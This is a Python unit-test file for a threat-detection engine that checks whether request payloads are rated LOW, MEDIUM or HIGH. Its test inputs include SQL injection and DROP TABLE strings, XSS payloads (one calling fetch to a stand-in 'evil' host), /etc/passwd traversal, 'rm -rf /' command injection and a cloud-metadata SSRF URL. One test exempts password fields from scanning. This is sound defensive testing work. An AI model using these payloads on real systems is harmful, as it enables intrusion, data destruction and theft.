"""Unit tests for the automated threat-detection engine."""
from app.threat import analyze_payload


def test_benign_payload_is_low():
    level, reasons = analyze_payload(
        {"resource_id": 1, "check_in": "2026-10-10", "check_out": "2026-10-13"}
    )
    assert level == "LOW"
    assert reasons == []


def test_sql_injection_or_1_1_is_high():
    level, reasons = analyze_payload({"q": "' OR 1=1 --"})
    assert level == "HIGH"
    assert any("SQL injection" in r for r in reasons)


def test_sql_injection_union_select_is_high():
    level, _ = analyze_payload({"name": "1 UNION SELECT password FROM users"})
    assert level == "HIGH"


def test_stacked_drop_statement_is_high():
    level, _ = analyze_payload({"id": "1; DROP TABLE users"})
    assert level == "HIGH"


def test_xss_script_tag_is_high():
    level, reasons = analyze_payload({"comment": "<script>alert(document.cookie)</script>"})
    assert level == "HIGH"
    assert any("XSS" in r for r in reasons)


def test_xss_event_handler_is_high():
    level, _ = analyze_payload({"html": '<img src=x onerror="fetch(\'//evil\')">'})
    assert level == "HIGH"


def test_path_traversal_is_high():
    level, _ = analyze_payload({"file": "../../../../etc/passwd"})
    assert level == "HIGH"


def test_command_injection_is_high():
    level, _ = analyze_payload({"name": "guest; rm -rf /"})
    assert level == "HIGH"


def test_ssrf_internal_metadata_is_medium():
    level, reasons = analyze_payload({"url": "http://169.254.169.254/latest/meta-data/"})
    assert level == "MEDIUM"
    assert any("SSRF" in r or "Internal host" in r for r in reasons)


def test_sql_comment_marker_is_medium():
    level, _ = analyze_payload({"q": "abc' --"})
    assert level == "MEDIUM"


def test_credential_stuffing_is_medium():
    level, _ = analyze_payload({"note": "admin:password"})
    assert level == "MEDIUM"


def test_password_fields_are_not_flagged():
    """Cleartext credential fields must not trigger false positives."""
    level, reasons = analyze_payload({"password": "' OR 1=1 --"})
    assert level == "LOW"
    assert reasons == []


def test_nested_payloads_are_flattened():
    level, reasons = analyze_payload(
        {"filters": {"dates": {"range": "<script>alert(1)</script>"}}}
    )
    assert level == "HIGH"
    assert any("range" in r for r in reasons)


def test_list_payloads_are_scanned():
    level, _ = analyze_payload({"tags": ["safe", "'; DROP TABLE x; --"]})
    assert level == "HIGH"


def test_empty_payload_is_low():
    assert analyze_payload({}) == ("LOW", [])
